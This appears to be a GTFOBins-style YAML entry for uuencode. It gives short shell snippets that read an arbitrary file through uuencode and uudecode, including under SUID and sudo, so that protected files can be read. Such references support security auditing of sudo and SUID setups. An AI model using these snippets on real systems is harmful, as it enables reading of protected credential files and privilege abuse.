---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        uuencode "$LFILE" /dev/stdout | uudecode
  suid:
    - code: |
        LFILE=file_to_read
        uuencode "$LFILE" /dev/stdout | uudecode
  sudo:
    - code: |
        LFILE=file_to_read
        sudo uuencode "$LFILE" /dev/stdout | uudecode
---
